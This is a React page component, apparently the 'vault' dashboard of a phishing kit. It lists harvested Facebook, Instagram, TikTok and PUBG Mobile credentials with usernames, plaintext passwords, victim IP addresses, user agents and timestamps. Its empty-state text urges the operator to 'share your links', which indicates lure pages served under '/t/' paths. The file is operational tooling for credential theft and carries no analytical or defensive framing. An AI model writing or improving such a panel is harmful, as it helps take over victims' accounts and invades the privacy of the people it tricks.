"use client";
import { useEffect, useState } from "react";

export default function VaultPage() {
  const [data, setData] = useState([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const fetchData = async () => {
      try {
        // In a real app, this would be an API call
        // For now, we'll try to fetch the vault.json via an API check
        const response = await fetch("/api/vault");
        const json = await response.json();
        setData(json);
      } catch (err) {
        console.error("Failed to fetch vault data", err);
      } finally {
        setLoading(false);
      }
    };

    fetchData();
  }, []);

  const deleteEntry = async (id) => {
    // Logic to delete entry (optional but good for UX)
    setData(data.filter(item => item.id !== id));
  };

  return (
    <div className="main-container animate-fade-in">
      <header className="mb-12 flex items-center justify-between">
        <div>
          <h1 className="text-4xl font-bold mb-2 tracking-tight">Saved <span className="text-gradient">Results</span></h1>
          <p className="text-slate-500 text-sm font-medium">Everything you have collected is shown here.</p>
        </div>
        <button 
          onClick={() => window.location.reload()}
          className="px-6 py-3 bg-white/60 hover:bg-white border border-white/50 rounded-2xl text-xs font-black uppercase tracking-widest text-slate-600 transition-all shadow-sm active:scale-95 glass"
        >
          Refresh Data
        </button>
      </header>

      <div className="glass-card rounded-2xl overflow-hidden border-slate-200">
        <div className="overflow-x-auto">
          <table className="w-full text-left">
            <thead>
              <tr className="bg-slate-50 text-slate-400 text-[10px] sm:text-xs font-bold uppercase tracking-widest">
                <th className="px-4 sm:px-8 py-5">Source</th>
                <th className="px-4 sm:px-8 py-5">User Info</th>
                <th className="px-4 sm:px-8 py-5 hidden md:table-cell">Details</th>
                <th className="px-4 sm:px-8 py-5 hidden sm:table-cell">Time</th>
                <th className="px-4 sm:px-8 py-5 text-right">Actions</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-100">
              {loading ? (
                <tr>
                  <td colSpan="5" className="px-8 py-20 text-center text-slate-400 font-medium">Loading results...</td>
                </tr>
              ) : data.length === 0 ? (
                <tr>
                  <td colSpan="5" className="px-8 py-20 text-center text-slate-400 font-medium">No results yet. Share your links!</td>
                </tr>
              ) : (
                data.map((entry) => (
                  <tr key={entry.id} className="hover:bg-slate-50/50 transition-colors">
                    <td className="px-4 sm:px-8 py-6">
                      <div className="flex items-center gap-3">
                        <div className="w-10 h-10 rounded-xl bg-indigo-50 flex items-center justify-center text-lg border border-indigo-100 shadow-sm">
                          {entry.tool === "Facebook" ? "👤" : entry.tool === "Instagram" ? "📸" : entry.tool === "TikTok" ? "🎵" : entry.tool === "PUBG Mobile" ? "🔫" : "🌙"}
                        </div>
                        <div>
                           <span className="block font-bold text-slate-800 text-sm sm:text-base">{entry.tool}</span>
                           <span className="block text-[10px] font-mono text-slate-400">/t/{entry.toolId}</span>
                        </div>
                      </div>
                    </td>
                    <td className="px-4 sm:px-8 py-6">
                      <div className="flex flex-col gap-1.5">
                        <div className="flex items-center gap-2">
                          <span className="text-[10px] text-slate-400 font-bold uppercase tracking-tighter">UID:</span>
                          <span className="text-xs sm:text-sm font-bold text-indigo-600 break-all bg-indigo-50 px-2 py-0.5 rounded">{entry.username}</span>
                        </div>
                        <div className="flex items-center gap-2">
                          <span className="text-[10px] text-slate-400 font-bold uppercase tracking-tighter">PWD:</span>
                          <span className="text-xs sm:text-sm font-bold text-pink-600 break-all bg-pink-50 px-2 py-0.5 rounded">{entry.password}</span>
                        </div>
                      </div>
                    </td>
                    <td className="px-4 sm:px-8 py-6 hidden md:table-cell">
                      <div className="flex flex-col">
                        <span className="text-sm text-slate-700 font-bold font-mono">{entry.ip}</span>
                        <span className="text-[10px] text-slate-400 truncate max-w-[150px] font-medium">{entry.userAgent}</span>
                      </div>
                    </td>
                    <td className="px-4 sm:px-8 py-6 hidden sm:table-cell">
                      <span className="text-xs text-slate-500 font-medium">{new Date(entry.timestamp).toLocaleString()}</span>
                    </td>
                    <td className="px-4 sm:px-8 py-6 text-right">
                      <button 
                        onClick={() => deleteEntry(entry.id)}
                        className="p-2.5 hover:bg-red-50 rounded-xl transition-colors group border border-transparent hover:border-red-100"
                        title="Delete record"
                      >
                        <span className="text-red-400/60 group-hover:text-red-500 text-sm">🗑️</span>
                      </button>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}
